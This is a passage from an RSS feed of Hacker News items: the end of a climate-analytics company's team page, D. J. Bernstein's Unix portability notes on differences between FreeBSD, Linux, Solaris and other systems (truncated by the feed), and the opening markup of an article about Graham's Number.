https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f9abe7236f0d92fdef112da_Anzeige-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f9abe7236f0d92fdef112da_Anzeige-p-1600.png 1600w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5f9abe7236f0d92fdef112da_Anzeige.png 1920w" alt=""></p><div><div><p>Financial performance and climate impact analysis join forces in this new software. </p><p>Gain transparency on climate impact and temperature alignment in your portfolio and the individual securities within it. Identify best-in-class climate performers and transition companies from your investable universe through sector benchmarking. Use science-based climate metrics to create a verifiably Paris-aligned portfolio and help shape a &lt;2°C future.</p><p><a href="https://portfolio.xdegreecompatible.de/#/" target="_blank"><em>Find out more</em></a></p><p><a href="mailto:info@right-basedonscience.de?subject=Trial%20XDC%20Portfolio%20Explorer"><em>Request trial</em></a><em> </em></p></div></div></div></div></section><div id="team"><h2>Our Team</h2><p>The team at right. shares an enthusiasm for connecting insights from climate science to macro- and micro-economic data, and for increasing the transparency around climate-related risks and opportunities in the market.In cooperation with our customers in the financial sector and in the real economy, we aspire to set the methodological standards for identifying, understanding and managing the climate impact of an economic entity.</p><div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f023e6f1334_Image_hannah.jpg" width="436" sizes="(max-width: 479px) 52vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f023e6f1334_Image_hannah-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f023e6f1334_Image_hannah-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f023e6f1334_Image_hannah.jpg 872w" alt=""></p><h4>Hannah <br>Helmke</h4><p>Founder &amp; CEO</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f9f016f132d_Image_sebastian.jpg" width="436" height="" sizes="(max-width: 479px) 63vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f9f016f132d_Image_sebastian-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f9f016f132d_Image_sebastian-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ddbd8f4d31f0f9f016f132d_Image_sebastian.jpg 872w" alt=""></p><h4>Dr. Sebastian <br>Müller, LL.M</h4><p>Founder &amp; In-house Lawyer</p></div><div id="w-node-_08fb0967-428c-79a3-759d-63a767297e2b-8263727c"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9494c8fc31cdd2a9111e6a_right._Susan_Ranchber_kl.png" width="436" sizes="(max-width: 479px) 66vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9494c8fc31cdd2a9111e6a_right._Susan_Ranchber_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9494c8fc31cdd2a9111e6a_right._Susan_Ranchber_kl-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9494c8fc31cdd2a9111e6a_right._Susan_Ranchber_kl.png 872w" alt=""></p><h4>Susan <br>Ranchber, M.Sc.</h4><p>Project Lead right.open</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e94942f94de6443ec629066_right._Dr._Benjamin_Eberhardt_kl.png" width="436" sizes="(max-width: 479px) 65vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e94942f94de6443ec629066_right._Dr._Benjamin_Eberhardt_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e94942f94de6443ec629066_right._Dr._Benjamin_Eberhardt_kl.png 872w" alt=""></p><h4>Dr. Benjamin <br>Eberhardt</h4><p>Head of Model Development</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e87600660a02cf17a693ac8_right._Nicolas_Schuerhoff.jpg" width="436" sizes="(max-width: 479px) 72vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e87600660a02cf17a693ac8_right._Nicolas_Schuerhoff-p-500.jpeg 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e87600660a02cf17a693ac8_right._Nicolas_Schuerhoff-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e87600660a02cf17a693ac8_right._Nicolas_Schuerhoff-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e87600660a02cf17a693ac8_right._Nicolas_Schuerhoff-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e87600660a02cf17a693ac8_right._Nicolas_Schuerhoff.jpg 2000w" alt=""></p><h4>Nicolas <br>Schuerhoff</h4><p>Head of XDC for Corporates</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e908ba61ca27ae7f71e4c4d_right._Dominique_Dare_kl.png" width="436" sizes="(max-width: 479px) 74vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e908ba61ca27ae7f71e4c4d_right._Dominique_Dare_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e908ba61ca27ae7f71e4c4d_right._Dominique_Dare_kl.png 872w" alt=""></p><h4>Dominique <br>Dare, CFA, CIPM</h4><p>Head of XDC for Finance</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino.png" width="436" sizes="(max-width: 479px) 71vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino-p-1600.png 1600w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino-p-2000.png 2000w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db30c7a006e32d71c52f9_right._Dr._Jacopo_Pellegrino.png 2297w" alt=""></p><h4>Dr. Jacopo <br>Pellegrino</h4><p>Modellentwicklung</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e949580b6f27466c8660af6_right._Frank_Wolf_KL.png" width="436" sizes="(max-width: 479px) 78vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e949580b6f27466c8660af6_right._Frank_Wolf_KL-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e949580b6f27466c8660af6_right._Frank_Wolf_KL-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e949580b6f27466c8660af6_right._Frank_Wolf_KL.png 872w" alt=""></p><h4>Frank <br>Wolf</h4><p>Softwareentwicklung / Freelancer</p></div></div><div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db67761ab577045b34aa6_right._Dr._Hans-Peter_Hafner_kl.png" height="" alt=""></p><h4>Dr. Hans-Peter <br>Hafner</h4><p>Klimawissenschaft und Mathematik</p></div><div id="w-node-_08fb0967-428c-79a3-759d-63a767297e71-8263727c"><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8501ac949dfa935b366_Fabian%20Gebert_KL.png" width="436" sizes="(max-width: 479px) 78vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8501ac949dfa935b366_Fabian%20Gebert_KL-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8501ac949dfa935b366_Fabian%20Gebert_KL-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8501ac949dfa935b366_Fabian%20Gebert_KL.png 1600w" alt=""></p><h4>Fabian <br>Gebert</h4><p>Softwareentwicklung / Freelancer</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493e60dd0cb27a8ed52c3_right._Dr._Kailen_Shantz_kl.png" width="436" sizes="(max-width: 479px) 68vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493e60dd0cb27a8ed52c3_right._Dr._Kailen_Shantz_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493e60dd0cb27a8ed52c3_right._Dr._Kailen_Shantz_kl-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493e60dd0cb27a8ed52c3_right._Dr._Kailen_Shantz_kl.png 872w" alt=""></p><h4>Dr. Kailen <br>Shantz</h4><p>Datenwissenschaft</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8da7a006e47c51c7b31_right._Jonas_Becker_1_KL.png" width="436" sizes="(max-width: 479px) 78vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8da7a006e47c51c7b31_right._Jonas_Becker_1_KL-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8da7a006e47c51c7b31_right._Jonas_Becker_1_KL-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8da7a006e47c51c7b31_right._Jonas_Becker_1_KL-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8db8da7a006e47c51c7b31_right._Jonas_Becker_1_KL.png 1600w" alt=""></p><h4>Jonas <br>Becker</h4><p>Softwareentwicklung</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild.png" width="436" height="" sizes="(max-width: 479px) 43vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild.png 872w" alt=""></p><h4>Julia <br>Haase</h4><p>Information Designer</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de6e9f175eb3da600675a_right._Marcela_Scarpellini_1_kl.png" width="436" sizes="(max-width: 479px) 75vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de6e9f175eb3da600675a_right._Marcela_Scarpellini_1_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de6e9f175eb3da600675a_right._Marcela_Scarpellini_1_kl-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de6e9f175eb3da600675a_right._Marcela_Scarpellini_1_kl-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de6e9f175eb3da600675a_right._Marcela_Scarpellini_1_kl.png 1599w" alt=""></p><h4>Marcela <br>Scarpellini, LL.M.</h4><p>Research</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de75ac2e6e3f02eb51ed0_right._Sonja_Honigmann_kl.png" width="436" height="" sizes="(max-width: 479px) 77vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de75ac2e6e3f02eb51ed0_right._Sonja_Honigmann_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de75ac2e6e3f02eb51ed0_right._Sonja_Honigmann_kl-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8de75ac2e6e3f02eb51ed0_right._Sonja_Honigmann_kl.png 1063w" alt=""></p><h4>Sonja <br>Honigmann</h4><p>Team Corporates</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493a35713f63c3bb339a2_right._Linda_Schultze_kl.png" width="436" height="" sizes="(max-width: 479px) 78vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493a35713f63c3bb339a2_right._Linda_Schultze_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e9493a35713f63c3bb339a2_right._Linda_Schultze_kl.png 872w" alt=""></p><h4>Linda <br>Schultze</h4><p>Personalmanagement</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f445b59c7e1701196321c_right._Elza_Martinez%202_kl.png" width="436" height="" sizes="(max-width: 479px) 65vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f445b59c7e1701196321c_right._Elza_Martinez%202_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f445b59c7e1701196321c_right._Elza_Martinez%202_kl-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f445b59c7e1701196321c_right._Elza_Martinez%202_kl.png 1550w" alt=""></p><h4>Elza <br>Martinez</h4><p>Office Manager / <br>Assistenz der Geschäftsführung</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f447f4bf4e40fd681e7be_Lennart_Schweser_kl.png" width="436" sizes="(max-width: 479px) 71vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f447f4bf4e40fd681e7be_Lennart_Schweser_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e8f447f4bf4e40fd681e7be_Lennart_Schweser_kl.png 582w" alt=""></p><h4>Lennart <br>Schweser</h4><p>Modellentwicklung / Werkstudent</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild.png" width="436" height="" sizes="(max-width: 479px) 53vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5e90497c28e5d0cb025aceda_Fehlendes%20Bild.png 872w" alt=""></p><h4>Nele <br>Drott</h4><p>right.open / Werkstudentin</p></div><div><p><img src="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ee76abcb5349f10a0e6903e_2020_Ana_Sousa_kl.png" width="436" height="" sizes="(max-width: 479px) 43vw, (max-width: 767px) 26vw, 22vw" srcset="https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ee76abcb5349f10a0e6903e_2020_Ana_Sousa_kl-p-500.png 500w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ee76abcb5349f10a0e6903e_2020_Ana_Sousa_kl-p-800.png 800w, https://uploads-ssl.webflow.com/5ddbd8f4d31f0fb0ad6f12fd/5ee76abcb5349f10a0e6903e_2020_Ana_Sousa_kl.png 872w" alt=""></p><h4>Ana <br>Sousa</h4><p>Intern</p></div></div></div></div></div><section id="gallery"></section><div><h2>XDC Consulting Partners &amp; Partners</h2></div><!--[if lte IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif]-->
</div>]]>
            </description>
            <link>https://www.right-basedonscience.de/en</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213827</guid>
            <pubDate>Sun, 21 Feb 2021 14:52:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unix Portability Notes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26213825">thread link</a>) | @varbhat
<br/>
February 21, 2021 | https://cr.yp.to/docs/unixport.html | <a href="https://web.archive.org/web/*/https://cr.yp.to/docs/unixport.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<a href="https://cr.yp.to/djb.html">D. J. Bernstein</a>
<br><a href="https://cr.yp.to/unix.html">UNIX</a>

This web page describes various differences
between FreeBSD, Linux, Solaris, etc.
from a programmer's perspective.
Some of the differences are for good reasons
(for example, a new feature has been added to one system,
and the others haven't yet caught up);
others are for frivolous reasons
(for example, a distributor was too lazy to protect its include files).
Some of the differences are particularly dangerous
because they don't cause obvious compilation failures.
<p>
Many portability problems would disappear
if UNIX distributors followed the rule stated by Kernighan and Pike
in The Practice of Programming, Section 8.7:
``Change the name if you change the specification.''
The <i>original author</i> of a program can often get away with spec changes,
because everyone is going to upgrade eventually;
but spec changes made by <i>distributors</i>
are often ignored by other distributors.
For example,
signal() has been a portability disaster for <i>twenty years</i>,
because some distributors (starting with CSRG)
decided to change the signal() spec without changing the name,
while other distributors decided to leave the spec alone.
</p><p>
Notes to programmers:
</p><ul>
<li>Using a ``standard'' function to do something simple?
Consider the possibility that the function isn't portable.
Consider writing a replacement function instead.
</li><li>Using cpp to check for machine features?
Consider the possibility that the relevant cpp macros aren't portable.
Consider writing a test program that tests for the features instead.
For example,
if you're trying to figure out which types a C compiler supports
(e.g., to provide maximum alignment to a union),
don't use #ifdefs of macros supposedly related to the types;
simply try compiling each type.
</li><li>Using command-line options to modify a program's output?
Consider the possibility that the options aren't portable.
Consider using a pipe to a separate program that modifies the program's output.
</li></ul>
<h2>accept</h2>
On some systems (Linux 2.0; Linux 2.2; HP-UX 10.20),
O_NONBLOCK is not copied from a listening socket
to an accepted socket.
Correct behavior (BSD; Solaris)
is to copy O_NONBLOCK.
Workaround: Set O_NONBLOCK manually.
<h2>awk</h2>
Sun ships both awk and nawk.
Some vendors ship nawk but call it awk.
Some vendors ship gawk, calling it awk, nawk, and gawk.
awk and nawk have different interpretations of commas after sprintf;
awk treats the string 3x as the number 0, not 3;
awk doesn't support sub, gsub, gensub, delete, tolower, et al.
<h2>bash</h2>
Old versions of bash don't support <tt>((i++))</tt>.
Fix: <tt>i=`expr $i + 1`</tt>.
<h2>char</h2>
Reported by Seth Kurtzberg:
By default, char is unsigned char with the AIX compiler.
<p>
Some linkers don't give generic alignment to huge byte arrays.
</p><p>
Compiler bug:
gcc 2.8.* and 2.95 fold string literals
if the string literals have the same length
and the same bytes through the first \0.
For example,
(x ? "\1\0\2" : "\1\0\3") is folded to "\1\0\2".
</p><h2>chmod</h2>
Under BSD/OS, the sticky bit can't be set on normal files.
<h2>connect</h2>
Under OpenBSD, connect() to 0.0.0.0 fails.
Other systems connect to the primary interface.
<p>
Portably determining the error after a non-blocking connection is tricky.
I have a
<a href="https://cr.yp.to/docs/connect.html">separate web page</a> discussing this.
</p><h2>date</h2>
Reported by Peter Johnson:
``On NetBSD and FreeBSD, the command 'date -r sec'
prints out the date and time "sec" seconds since the Epoch.
On Redhat and Debian, 'date -r file'
prints out the date and time when file "file" was last modified.''
<h2>diff</h2>
HP-UX diff doesn't support -a or -q. (Also -d?)
<h2><a name="errno">errno</a></h2>
Kernel designers often add
system-specific macros to <tt>errno.h</tt>.
Workaround:
in files that include <tt>errno.h</tt>,
avoid all macros beginning with the letter <tt>E</tt>.
<p>
Recent Linux distributions (recent versions of glibc)
refuse to compile programs that declare
<tt>extern int errno</tt> without including <tt>errno.h</tt>.
This is a bug, as discussed below.
Correct behavior
(all other C libraries: BSD, Solaris, etc.)
is to accept <tt>extern int errno</tt> whether or not <tt>errno.h</tt>
is included.
The workaround for this Linux bug is to include <tt>errno.h</tt> everywhere,
for example by compiling with <tt>gcc -include /usr/include/errno.h</tt>.
</p><p>
Further comments on the Linux bug:
When this change was introduced,
it was a clear and flagrant violation of IEEE Std 1003.1-1990 (POSIX),
which specifies the correct declaration to be <tt>extern int errno</tt>,
nothing more, nothing less.
When Paul Wanish formally requested in 2001 that IEEE issue an "interpretation"
of IEEE Std 1003.1-1990 as meaning something other than what it says,
IEEE refused:
</p><blockquote>
IEEE Std 1003.1-1990 specifies that
  extern int errno;
is the correct declaration for errno.  This is not a shorthand
for a different meaning.
</blockquote>
The glibc authors' excuse for violating IEEE Std 1003.1-1990
(and for loudly demanding changes in subsequent standards)
is that threaded programs need a variable <tt>errno</tt> address.
This excuse doesn't stand up to even the slightest examination.
Yes, threaded programs need to include <tt>errno.h</tt>,
but it's trivial to keep <tt>extern int errno</tt> working
for all the non-threaded programs.
The C library simply defines an <tt>int errno</tt>
and has its address as the initial value for the thread <tt>errno</tt> pointer.
<h2>expr</h2>
<tt>expr match x y</tt> is Linux-specific.
<tt>expr x : y</tt> is portable.
<p>
<tt>expr index xyz abc</tt> is Linux-specific.
<tt>echo xyz | sed -n 's/[abc].*//p' | wc -c</tt> is portable.
</p><h2>find</h2>
Old versions of <tt>find</tt> allow
<tt>find -perm -mmm</tt> to look for files
whose mode bits include <tt>mmm</tt>,
and
<tt>find -perm mmm</tt> to look for files
whose mode bits are exactly <tt>mmm</tt>,
but not <tt>find -perm +mmm</tt> to look for files
whose mode bits include <i>at least one</i> of <tt>mmm</tt>,
For example,
they support
<tt>find -perm -0700</tt>
to look for executables,
but not
<tt>find -perm +0700</tt>.
<p>
Old versions of <tt>find</tt> don't allow <tt>-maxdepth</tt>.
</p><p>
Old versions of <tt>find</tt> don't allow <tt>-L</tt>.
Workaround:
replace, e.g.,
<tt>find -L srctree -name '*.c'</tt>
with
<tt>find srctree -follow -name '*.c'</tt>.
The Linux manual pages say that <tt>-follow</tt> is deprecated;
it would be easier to take this seriously if <tt>-L</tt> were portable.
</p><p>
The BusyBox version of <tt>find</tt> doesn't allow <tt>exec</tt>.
Workaround:
replace, e.g.,
<tt>find top -type f -exec inspect '{}' ';'</tt>
with
<tt>find top -type f -print0 | xargs -n1 -0 inspect</tt>.
But, oops, the BusyBox version of <tt>xargs</tt> doesn't allow <tt>-0</tt>.
Sigh.
</p><h2>flock</h2>
sys/file.h is not protected (i.e., can't be included twice) under SCO.
<p>
HP/UX and Solaris don't support flock().
</p><p>
On some systems, read-only files can't be locked.
(This is a good thing.)
</p><h2>gethostname</h2>
Under Solaris, gethostname() needs -lsocket -lnsl.
<p>
On some sysctl-based systems,
gethostname() doesn't write anything if the output buffer is too small.
It should write a truncated name.
</p><h2>getpwnam</h2>
On normal systems,
getpwnam() returns passwords if it's running as root.
On Linux,
getpwnam() returns passwords only for users without shadow passwords;
one must also try the non-portable getspnam()
and use its results if it succeeds. 
Similarly, on AIX,
one must try the non-portable getuserpw().
<p>
PAM-based systems can put 0 into pw_passwd.
</p><h2>getrusage</h2>
FreeBSD and OpenBSD need sys/time.h, not just time.h, before sys/resource.h.
<h2>grep</h2>
Solaris grep doesn't support -q.
Solution: change grep -q to grep 2&gt;/dev/null.
<p>
Solaris grep doesn't support -E.
Solution: change grep -E to egrep.
</p><h2>groups</h2>
Under Solaris, /usr/bin/groups reports the group in /etc/group,
rather than the results of getgroups().
<h2>hostname</h2>
Unisys SVR4 doesn't have the hostname command in the standard user path.
<h2>inittab</h2>
Under HP/UX, Solaris, et al.,
commands run by init are subject to job-control signals.
<h2>lockf</h2>
HP/UX reportedly returns EACCES for lock failures.
<p>
Solaris, HP/UX, et al.
allow one process to have many exclusive locks on one file.
</p><h2>logger</h2>
On some systems,
logger uses syslog(pri,buf) instead of syslog(pri,"%s",buf),
so it could barf or crash if fed messages containing %.
<h2>long long</h2>
Compiler bug:
gcc 2.95.2 -O2 massively screws up long long parameter passing.
<p>
<tt>-pedantic</tt> breaks long long under BSD.
</p><h2>mail</h2>
Under RISC/OS, BSD mail passes the -bm option to sendmail.
Under NEWS-OS, BSD mail passes the -E and -J options to sendmail.
<h2>make</h2>
Some versions of make
don't understand that a line with just a tab is blank.
<h2>md5sum</h2>
BSD has md5 (and openssl md5), not md5sum.
Linux has md5sum (and sometimes openssl md5), not md5.
Workaround: Pipe input through
<pre>     ( openssl md5 || md5sum || md5 )
</pre>
to use whichever one works.
<p>
Solaris doesn't have any of these.
Workaround, if you simply want <i>some</i> checksum,
not consistent across systems:
</p><pre>     ( openssl md5 || md5sum || md5 || cksum )
</pre>
<h2>mkdir</h2>
Some systems (examples: Linux, OpenBSD)
return EISDIR for mkdir("/",...).
Correct behavior (example: Solaris)
is to return EEXIST.
<h2>mkfifo</h2>
Apparently no longer a problem
(although the old mknod seems fine too).
I haven't seen any -mkfifo reports since August 1999.
<h2>O_NDELAY</h2>
Solaris 2.5.1 incorrectly converts O_NDELAY into O_NONBLOCK for sockets.
The result is that clearing O_NDELAY doesn't undo setting O_NDELAY.
Workaround: Use O_NONBLOCK instead.
Nowadays it seems that O_NONBLOCK is perfectly portable,
so there's no reason to use O_NDELAY.
<h2>poll</h2>
Darwin (MacOS X) still doesn't support poll().
<p>
Library bug:
The RedHat 5.1 poll() emulation library
doesn't clear revents when select() returns 0.
Workaround (e.g., in my io library):
Set revents to 0 on entry.
</p><p>
Kernel bug:
On FreeBSD 4.8,
poll() on a bad descriptor fails to indicate POLLIN and POLLOUT;
it indicates only POLLERR.
The idea of handling descriptors separately
(rather than exploding the entire poll with an EBADF) is good,
but there's no excuse for not indicating readability and writability.
Workaround: Check for POLLERR along with POLLIN and POLLOUT.
</p><p>
Kernel bug:
On Linux and Solaris,
poll() fails to set POLLIN for EOF on some types of files, notably pipes.
(Richard Kettlewell has a detailed comparison chart
showing which systems return which combinations of POLLIN and POLLHUP.)
Workaround: Check for POLLHUP along with POLLIN.
</p><h2>_POSIX_VDISABLE</h2>
SunOS doesn't have _POSIX_VDISABLE.
(But it does have _PC_VDISABLE.)
<p>
OSF/1 has _POSIX_VDISABLE in unistd.h rather than termios.h.
</p><h2>ptys</h2>
Under OSF/1, sys/ptms.h is spelled sys/ptys.h.
<p>
Kernel bug:</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cr.yp.to/docs/unixport.html">https://cr.yp.to/docs/unixport.html</a></em></p>]]>
            </description>
            <link>https://cr.yp.to/docs/unixport.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26213825</guid>
            <pubDate>Sun, 21 Feb 2021 14:52:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Picture of Graham's Number]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26213727">thread link</a>) | @scrollaway
<br/>
February 21, 2021 | https://mindsarentmagic.org/2020/02/19/a-picture-of-grahams-number/ | <a href="https://web.archive.org/web/*/https://mindsarentmagic.org/2020/02/19/a-picture-of-grahams-number/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-616">

	

	
	<div>
		
